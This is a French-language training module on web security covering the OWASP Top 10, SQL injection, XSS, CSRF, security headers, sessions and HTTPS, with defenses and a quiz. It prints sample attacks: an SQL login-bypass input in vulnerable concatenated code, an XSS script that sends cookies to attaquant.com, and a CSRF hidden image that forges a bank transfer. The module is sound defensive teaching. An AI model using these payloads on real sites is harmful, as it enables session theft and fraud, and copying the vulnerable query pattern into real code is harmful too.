# Module 4 : Sécurité Web

[← Module précédent](module3-securite-reseau.md) | [Retour au sommaire](../README.md) | [Module suivant →](module5-mots-de-passe.md)

---

## 4.1 Introduction à la Sécurité Web

Les applications web sont parmi les cibles les plus fréquentes des cyberattaques car elles sont exposées sur Internet et souvent manipulées par des utilisateurs. Comprendre les vulnérabilités web est essentiel pour tout développeur ou administrateur.

### Le Top 10 OWASP

L'**OWASP** (Open Web Application Security Project) publie régulièrement une liste des 10 risques de sécurité les plus critiques pour les applications web.

| Rang | Risque |
|------|--------|
| 1 | Contrôle d'accès défaillant |
| 2 | Défaillances cryptographiques |
| 3 | Injection |
| 4 | Conception non sécurisée |
| 5 | Mauvaise configuration de sécurité |
| 6 | Composants vulnérables ou obsolètes |
| 7 | Identification et authentification défaillantes |
| 8 | Défaillances d'intégrité logicielle et des données |
| 9 | Carence en journalisation et surveillance |
| 10 | Falsification de requêtes côté serveur (SSRF) |

---

## 4.2 Injection SQL (SQLi)

### Comment ça fonctionne

Une injection SQL se produit lorsque des données non validées sont insérées directement dans une requête SQL.

```python
# CODE VULNÉRABLE ❌
username = request.get('username')
query = "SELECT * FROM users WHERE username='" + username + "'"

# Si username = "admin' --"
# La requête devient :
# SELECT * FROM users WHERE username='admin' --'
# Le "--" commente le reste, bypasse le mot de passe !
```

```python
# CODE SÉCURISÉ ✅ (requêtes paramétrées)
username = request.get('username')
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

### Types d'injection SQL

| Type | Description |
|------|-------------|
| **In-band** | Les résultats sont directement visibles dans la réponse |
| **Blind** | Pas de résultat direct, l'attaquant infère via vrai/faux |
| **Out-of-band** | Les données sont exfiltrées via un autre canal |

### Prevention

- ✅ Utiliser des requêtes paramétrées (prepared statements)
- ✅ Utiliser un ORM sécurisé
- ✅ Valider et assainir toutes les entrées utilisateur
- ✅ Principe du moindre privilège pour les comptes de base de données
- ✅ Désactiver les messages d'erreur détaillés en production

---

## 4.3 Cross-Site Scripting (XSS)

### Comment ça fonctionne

Le XSS permet d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.

```html
<!-- Commentaire posté par un attaquant ❌ -->
Bonjour ! <script>
  fetch('https://attaquant.com/steal?c=' + document.cookie);
</script>

<!-- Ce script s'exécute dans le navigateur de chaque visiteur ! -->
```

### Types de XSS

| Type | Description | Persistance |
|------|-------------|-------------|
| **Stocké (Stored)** | Le payload est sauvegardé dans la base de données | Permanent |
| **Réfléchi (Reflected)** | Le payload est dans l'URL et renvoyé par le serveur | Non-permanent |
| **DOM-based** | Exploitation du DOM côté client | Non-permanent |

### Prévention

```html
<!-- Encodage des caractères spéciaux ✅ -->
<!-- < devient &lt; -->
<!-- > devient &gt; -->
<!-- " devient &quot; -->
<!-- ' devient &#x27; -->
```

- ✅ Encoder les sorties (HTML escaping)
- ✅ Content Security Policy (CSP) dans les en-têtes HTTP
- ✅ Utiliser `HttpOnly` et `Secure` pour les cookies
- ✅ Valider et assainir les entrées côté serveur

---

## 4.4 Cross-Site Request Forgery (CSRF)

### Comment ça fonctionne

Le CSRF force un utilisateur authentifié à effectuer des actions non voulues.

```html
<!-- Page malveillante visitée par la victime ❌ -->
<img src="https://banque.com/virement?montant=1000&destination=attaquant"
     style="display:none">
<!-- Le navigateur envoie automatiquement les cookies de session de la banque ! -->
```

### Prévention

- ✅ Utiliser des tokens CSRF (jeton anti-CSRF)
- ✅ Vérifier l'en-tête `Origin` ou `Referer`
- ✅ Attribut `SameSite` sur les cookies
- ✅ Re-authentification pour les actions sensibles

---

## 4.5 En-têtes de Sécurité HTTP

Les en-têtes HTTP permettent d'instruire le navigateur sur les politiques de sécurité à appliquer.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
  → Bloque les scripts depuis des domaines externes

X-Content-Type-Options: nosniff
  → Empêche le navigateur de deviner le type de contenu

X-Frame-Options: DENY
  → Empêche l'intégration dans des iframes (protection clickjacking)

Strict-Transport-Security: max-age=31536000; includeSubDomains
  → Force HTTPS pour 1 an

X-XSS-Protection: 1; mode=block
  → Active le filtre XSS du navigateur (ancien, remplacé par CSP)
```

---

## 4.6 Authentification et Gestion des Sessions

### Vulnérabilités courantes

- Mots de passe stockés en clair
- Sessions sans expiration
- Token de session prévisible
- Absence de protection contre la force brute

### Bonnes pratiques

```python
# Hachage sécurisé des mots de passe ✅
import bcrypt

# Stockage
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Vérification
is_valid = bcrypt.checkpw(password.encode(), hashed)
```

- ✅ Hacher les mots de passe avec bcrypt, Argon2 ou scrypt
- ✅ Générer des tokens de session aléatoires et imprévisibles
- ✅ Expirer les sessions après inactivité
- ✅ Implémenter la limite de tentatives de connexion
- ✅ Utiliser l'authentification multi-facteurs (MFA)

---

## 4.7 HTTPS et Certificats

### Importance de HTTPS

- Chiffre les données en transit
- Authentifie le serveur
- Garantit l'intégrité des données

### Vérification d'un certificat

```
🔒 https://www.banque-exemple.fr

Certificat valide :
  - Émis pour : www.banque-exemple.fr
  - Émis par : DigiCert (CA de confiance)
  - Valide jusqu'au : 01/01/2025
  - Chiffrement : TLS 1.3
```

> ⚠️ Un certificat valide ne garantit pas que le site est légitime ! Un attaquant peut obtenir un certificat pour un faux site (ex: `banque-exemple-secure.com`).

---

## 4.8 Bonnes Pratiques de Développement Sécurisé

### Le principe "Security by Design"

La sécurité doit être intégrée dès la conception, pas ajoutée après.

### Checklist de sécurité pour les développeurs

```
Entrées utilisateur :
☑ Valider et assainir toutes les entrées
☑ Ne jamais faire confiance aux données côté client
☑ Utiliser des listes blanches plutôt que des listes noires

Authentification et autorisation :
☑ Implémenter MFA
☑ Principe du moindre privilège
☑ Tester tous les contrôles d'accès

Données sensibles :
☑ Chiffrer les données au repos et en transit
☑ Ne pas logger les données sensibles
☑ Supprimer les données inutiles

Infrastructure :
☑ Maintenir les dépendances à jour
☑ Configurer correctement les en-têtes de sécurité
☑ Désactiver les fonctionnalités non utilisées
```

---

## 4.9 Quiz - Module 4

**Question 1** : Quel outil liste les 10 risques les plus critiques des applications web ?
- A) ANSSI
- B) OWASP ✅
- C) ISO 27001
- D) NIST

**Question 2** : Comment prévenir les injections SQL ?
- A) Utiliser des mots de passe forts
- B) Chiffrer la base de données
- C) Utiliser des requêtes paramétrées ✅
- D) Activer le pare-feu

**Question 3** : Qu'est-ce que le XSS stocké ?
- A) Un script injecté dans une URL
- B) Un script sauvegardé dans la base de données et exécuté par les visiteurs ✅
- C) Un script dans le DOM
- D) Un chiffrement des cookies

**Question 4** : À quoi sert l'en-tête `Content-Security-Policy` ?
- A) Chiffrer les cookies
- B) Contrôler les ressources que le navigateur peut charger ✅
- C) Forcer HTTPS
- D) Bloquer les DDoS

---

## Résumé du Module 4

✅ L'OWASP Top 10 identifie les risques web les plus critiques

✅ L'injection SQL est prévenue par les requêtes paramétrées

✅ Le XSS est prévenu par l'encodage des sorties et la CSP

✅ Les en-têtes HTTP de sécurité renforcent la protection des navigateurs

✅ HTTPS est indispensable pour chiffrer et authentifier les communications

✅ La sécurité doit être intégrée dès la conception (Security by Design)

---

[← Module précédent : Sécurité Réseau](module3-securite-reseau.md) | [Retour au sommaire](../README.md) | [Module suivant : Mots de Passe →](module5-mots-de-passe.md)
